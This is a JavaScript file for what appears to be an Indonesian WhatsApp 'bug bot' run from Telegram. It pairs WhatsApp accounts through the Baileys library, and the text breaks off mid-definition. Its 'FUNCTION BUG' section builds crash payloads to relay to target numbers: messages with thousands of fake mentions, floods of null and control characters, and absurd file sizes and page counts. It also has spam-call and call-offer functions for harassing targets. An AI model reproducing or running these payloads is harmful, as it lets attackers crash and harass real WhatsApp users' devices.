// BASE CREATE BY MBAPE NO HAPUS CREDIT ANJ

const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync("./assets/images/thumb.jpeg");
const FormData = require('form-data');
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk");
const commandLocks = {};
const config = require("./config.js");
const trackCache = new Map();
const moment = require("moment");
const userPollData = new Map();
global.userPollData = new Map();
const cheerio = require('cheerio');
const AdmZip = require('adm-zip');
const fromBuffer = require('file-type');
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync("./premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./premium.json");
ensureFileExists("./admin.json");

function savePremiumUsers() {
  fs.writeFileSync("./premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./admin.json", JSON.stringify(adminUsers, null, 2));
}

   const API_SOURCES = [
  "https://api.example1.com",
  "https://api.example2.com"
];

function escapeHtml(text) {
  return text.replace(/[&<>"]/g, function(m) {
    if (m === '&') return '&amp;';
    if (m === '<') return '&lt;';
    if (m === '>') return '&gt;';
    if (m === '"') return '&quot;';
    return m;
  });
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error("Error:", error);
      }
    }
  });
}

watchFile("./premium.json", (data) => (premiumUsers = data));
watchFile("./admin.json", (data) => (adminUsers = data));

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/mbapesuka/Mbpuyyy-/main/Token.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
    process.exit(1)
    for(;;){}
  }

  console.log(chalk.green(` JANGAN LUPA MASUK CH INFO SCRIPT⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

`));


console.log(chalk.greenBright(`
┌─────────────────────────────┐
│ ⚠️ inicialização em execução com sucesso  
├─────────────────────────────┤
│ DESENVOLVEDOR : DK      
│ TELEGRAMA : @MbapeGnteng
│ CHANEL : @testimbape
└─────────────────────────────┘
`));

console.log(chalk.blueBright(`
[ ----- ⚔️ ----- ]
`
));
};

validateToken();
let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sock.newsletterFollow("120363301087120650@newsletter");
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`◇ 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 ${botNumber}..... 𝙨𝙪𝙘𝙘𝙚𝙨\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
      sock.newsletterFollow("120363301087120650@newsletter");
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`◇ 𝙎𝙪𝙘𝙘𝙚𝙨 𝙥𝙧𝙤𝙨𝙚𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜\`\`\`
𝙔𝙤𝙪𝙧 𝙘𝙤𝙙𝙚 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari,${hours} Jam,${minutes} Menit`
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const start = process.hrtime();
  return function() {
    const diff = process.hrtime(start);
    return (diff[0] * 1e3 + diff[1] / 1e6).toFixed(2) + "ms";
  };
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

function getRandomImage() {
  const images = [
    "https://files.catbox.moe/kei4t3.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

const bagUrl = "https://files.catbox.moe/gmdqin.jpg";
const ownerUrl = "https://files.catbox.moe/dbra2d.jpg";
const bugUrl = "https://files.catbox.moe/lwyyvh.jpg";

// ~ Coldowwn

let cooldownData = fs.existsSync(cd)
  ? JSON.parse(fs.readFileSync(cd))
  : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
  fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
  if (cooldownData.users[userId]) {
    const remainingTime =
      cooldownData.time - (Date.now() - cooldownData.users[userId]);
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000);
    }
  }
  cooldownData.users[userId] = Date.now();
  saveCooldown();
  setTimeout(() => {
    delete cooldownData.users[userId];
    saveCooldown();
  }, cooldownData.time);
  return 0;
}

function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  saveCooldown();
  return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
  if (!link.includes("https://whatsapp.com/channel/"))
    return { error: "Link tidak valid!" };

  let channelId = link.split("https://whatsapp.com/channel/")[1];
  try {
    let res = await sock.newsletterMetadata("invite", channelId);
    return {
      id: res.id,
      name: res.name,
      subscribers: res.subscribers,
      status: res.state,
      verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak",
    };
  } catch (err) {
    return { error: "Gagal mengambil data! Pastikan channel valid." };
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
async function spamcall(target) {
  // Inisialisasi koneksi dengan makeWASocket
  const sock = makeWASocket({
    printQRInTerminal: false, // QR code tidak perlu ditampilkan
  });

  try {
    console.log(`📞 Mengirim panggilan ke ${target}`);

    // Kirim permintaan panggilan
    await sock.query({
      tag: "call",
      json: ["action", "call", "call", { id: `${target}` }],
    });

    console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
  } catch (err) {
    console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
  } finally {
    sock.ev.removeAllListeners(); // Hapus semua event listener
    sock.ws.close(); // Tutup koneksi WebSocket
  }
}

async function sendOfferCall(target) {
  try {
    await sock.offerCall(target);
    console.log(chalk.white.bold(`Success Send Offer Call To Target`));
  } catch (error) {
    console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
  }
}

async function sendOfferVideoCall(target) {
  try {
    await sock.offerCall(target, {
      video: true,
    });
    console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
  } catch (error) {
    console.error(
      chalk.white.bold(`Failed Send Offer Video Call To Target:`, error)
    );
  }
}
//--------------------------------------------FUNCTION BUG----------------------------------------------------------\\
async function ArchiveForcloseMaybetT(sock, target) {
  const Msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        productMessage: {
          product: {
            productImage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m231/AQNVVr96P2W2N6c2cWRXcRus7roBnJsAsj_DdImpCHGGMkqCTkwvpAuB7rd8IzTMFsenSI8bwq5v7C4_gCAZVUNY_aO-do-JVWcmCR1E4A?ccb=9-4&oh=01_Q5Aa3AFfmMdvZTkuDpy0g_3HpiCYo-g7sxug_OZv__Pz3YX4eg&oe=694013D5&_nc_sid=e6ed6c&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "/9OqehnTXlXT3BjmOSACk/6PA2YDD/LPI1rxiGARzIA=",
              fileLength: "1332709",
              height: 9999,
              width: 99999,
              mediaKey: "MBrUCtMvEYCXNxw2TLsPyUfPrIOxCV5b3TprGyU7LiA=",
              fileEncSha256: "GrCugonhvozxlTdX0uf0wfKvYTnXzeFVLb6Fw8V5eNc=",
              directPath: "/o1/v/t24/f2/m231/AQNVVr96P2W2N6c2cWRXcRus7roBnJsAsj_DdImpCHGGMkqCTkwvpAuB7rd8IzTMFsenSI8bwq5v7C4_gCAZVUNY_aO-do-JVWcmCR1E4A?ccb=9-4&oh=01_Q5Aa3AFfmMdvZTkuDpy0g_3HpiCYo-g7sxug_OZv__Pz3YX4eg&oe=694013D5&_nc_sid=e6ed6c",
              mediaKeyTimestamp: "1763027544",
              jpegThumbnail: null,
              scanLengths: [3868, 15516, 2975, 10686],
              midQualityFileSha256: "HWw9tUG2Ua+mMyq4OIl9Qm5NU0+8Nb/Ro2Ir2jGjfYQ="
            },
            productId: "25083871484575184",
            title: "𝐕𝐀𝐍𝐄𝐆𝐄𝐓𝐀 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘",
            currencyCode: "IDR",
            priceAmount1000: "25000000",
            productImageCount: 1,
            salePriceAmount1000: "20000000"
          },

          contextInfo: {
            mentionedJid: Array.from(
              { length: 2000 },
              (_, p) => `6285983729${p + 1}@s.whatsapp.net`
            ),

            remoteJid: "ＸＡＮＧＥＬ ＷＩＲＲ",

            statusAttributions: [
              {
                type: "STATUS_MENTION",
                music: {
                  authorName: "xangel",
                  songId: "1137812656623908",
                  title: "\u0000".repeat(1000),
                  author: "\x10".repeat(1000),
                  artistAttribution: "https://t.me/xangelxy",
                  isExplicit: true
                }
              }
            ]
          }

        }
      }
    }
  });

  await sock.relayMessage(target, Msg.message, {
    messageId: Msg.key.id
  });
}

async function memekone(target) {
  // Pastikan target tersedia sebelum eksekusi
  if (!target) return console.error("Target JID tidak ditentukan!");

  await sock.relayMessage(target, {
    galaxy_message: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Hika.nets.clooud._com",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: ""
            },
            hasMediaAttachment: true
          },
          body: {
            text: "\n\nMbape Approvedd\n\n" + 'ꦽ'.repeat(30000) + "@13135550202".repeat(15000)
          },
          nativeFlowMessage: {
            buttons: [{
              name: "cta_url",
              buttonParamsJson: JSON.stringify({ display_text: 'DocuXDelayGatau', url: "https://t.me/Hika" })
            }, {
              name: "call_permission_request",
              buttonParamsJson: "{}"
            }],
            messageParamsJson: "{}"
          },
          contextInfo: {
            mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({
              length: 30000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "Hika.folder.undefined.file.UgetUget",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: ""
              }
            }
          }
        }
      }
    }
  }, {
    // PERBAIKAN DI SINI:
    messageId: sock.generateMessageTag(), // Menggunakan tag otomatis lebih aman
    fromMe: true, 
    participant: target // Mengisi langsung dengan string JID, bukan { jid: target }
  });
}


async function ArchiveForcloseMaybetT(sock, target) {
  const { generateWAMessageFromContent } = (await import('@whiskeysockets/baileys')).default;

  const Msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        productMessage: {
          product: {
            productImage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m231/AQNVVr96P2W2N6c2cWRXcRus7roBnJsAsj_DdImpCHGGMkqCTkwvpAuB7rd8IzTMFsenSI8bwq5v7C4_gCAZVUNY_aO-do-JVWcmCR1E4A?ccb=9-4&oh=01_Q5Aa3AFfmMdvZTkuDpy0g_3HpiCYo-g7sxug_OZv__Pz3YX4eg&oe=694013D5&_nc_sid=e6ed6c&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: Buffer.from("/9OqehnTXlXT3BjmOSACk/6PA2YDD/LPI1rxiGARzIA=", 'base64'),
              fileLength: "1332709",
              height: 9999,
              width: 99999,
              mediaKey: Buffer.from("MBrUCtMvEYCXNxw2TLsPyUfPrIOxCV5b3TprGyU7LiA=", 'base64'),
              fileEncSha256: Buffer.from("GrCugonhvozxlTdX0uf0wfKvYTnXzeFVLb6Fw8V5eNc=", 'base64'),
              directPath: "/o1/v/t24/f2/m231/AQNVVr96P2W2N6c2cWRXcRus7roBnJsAsj_DdImpCHGGMkqCTkwvpAuB7rd8IzTMFsenSI8bwq5v7C4_gCAZVUNY_aO-do-JVWcmCR1E4A?ccb=9-4&oh=01_Q5Aa3AFfmMdvZTkuDpy0g_3HpiCYo-g7sxug_OZv__Pz3YX4eg&oe=694013D5&_nc_sid=e6ed6c",
              mediaKeyTimestamp: "1763027544",
              jpegThumbnail: null,
              scanLengths: [3868, 15516, 2975, 10686],
              midQualityFileSha256: Buffer.from("HWw9tUG2Ua+mMyq4OIl9Qm5NU0+8Nb/Ro2Ir2jGjfYQ=", 'base64')
            },
            productId: "25083871484575184",
            title: "INFINITY",
            currencyCode: "IDR",
            priceAmount1000: "25000000",
            productImageCount: 1,
            salePriceAmount1000: "20000000"
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, p) => `6285983729${p + 1}@s.whatsapp.net`),
            remoteJid: "M B A P E",
            statusAttributions: [
              {
                type: "STATUS_MENTION",
                music: {
                  authorName: "mbape",
                  songId: "1137812656623908",
                  title: "\0".repeat(1000),
                  author: "\x10".repeat(1000),
                  artistAttribution: "https://t.me/MbapeGnteng",
                  isExplicit: true
                }
              }
            ]
          }
        }
      }
    }
  }, { userJid: sock.user.id, quoted: null });
  await sock.relayMessage(target, Msg.message, {
    messageId: Msg.key.id
  });
}
//------------------------------------------------------------------------------------------------------------------------------\\

/* LOADINB FOR help*/

const startCooldown = new Set()

process.on("unhandledRejection", err => {
    console.error("UNHANDLED:", err)
})
process.on("uncaughtException", err => {
    console.error("CRASH:", err)
})
const delay = ms => new Promise(resolve => setTimeout(resolve, ms))

const loadingText = [
`<b><u>MBAPE OFFICIAL</u></b>

<blockquote expandable><b>╭═𓊈 SYSTEM INFORMATION 𓊉</b>
<b>║</b> <b>◈</b> Sabar Load ☇ [▓▓░░░░░░░░] 20%
<b>╰═─═─═─═─═─═─═─═─═─═─⪼</b></blockquote>`,

`<b><u>MBAPE OFFICIAL</u></b>

<blockquote expandable><b>╭═𓊈 SYSTEM INFORMATION 𓊉</b>
<b>║</b> <b>◈</b> Sabar Load ☇ [▓▓▓▓░░░░░░] 40%
<b>╰═─═─═─═─═─═─═─═─═─═─⪼</b></blockquote>`,

`<b><u>MBAPE OFFICIAL</u></b>

<blockquote expandable><b>╭═𓊈 SYSTEM INFORMATION 𓊉</b>
<b>║</b> <b>◈</b> Sabar Load ☇ [▓▓▓▓▓▓░░░░] 60%
<b>╰═─═─═─═─═─═─═─═─═─═─⪼</b></blockquote>`,

`<b><u>MBAPE OFFICIAL</u></b>

<blockquote expandable><b>╭═𓊈 SYSTEM INFORMATION 𓊉</b>
<b>║</b> <b>◈</b> Sabar Load ☇ [▓▓▓▓▓▓▓▓░░] 80%
<b>╰═─═─═─═─═─═─═─═─═─═─⪼</b></blockquote>`,

`<b><u>MBAPE OFFICIAL</u></b>

<blockquote expandable><b>╭═𓊈 SYSTEM INFORMATION 𓊉</b>
<b>║</b> <b>◈</b> Sabar Load ☇ [▓▓▓▓▓▓▓▓▓▓] 100%
<b>╰═─═─═─═─═─═─═─═─═─═─⪼</b></blockquote>`
]

async function showLoading(chatId, totalMs = 5000) {
    const stepDelay = Math.floor(totalMs / loadingText.length)

    const msg = await bot.sendMessage(chatId, loadingText[0], {
        parse_mode: "HTML"
    })

    for (let i = 1; i < loadingText.length; i++) {
        await delay(stepDelay)
        await bot.editMessageText(loadingText[i], {
            chat_id: chatId,
            message_id: msg.message_id,
            parse_mode: "HTML"
        })
    }

    await delay(300)
    await bot.deleteMessage(chatId, msg.message_id).catch(()=>{})
}

const keyboardIntervals = {};

function randomColor() {
  const colors = [

    [
      [
        { text: "Xbugs", callback_data: "trashmenu", style: "primary", icon_custom_emoji_id: "5350482910883375411" },
        { text: "Xsettinngs", callback_data: "menu", style: "primary", icon_custom_emoji_id: "6097881360112816903" }
      ],
      [
        { text: "Developers", url: "https://t.me/MbapeGnteng", style: "primary", icon_custom_emoji_id: "6098239916867588854" }
      ]
    ],

    [
      [
        { text: "Xbugs", callback_data: "trashmenu", style: "danger", icon_custom_emoji_id: "5350482910883375411" },
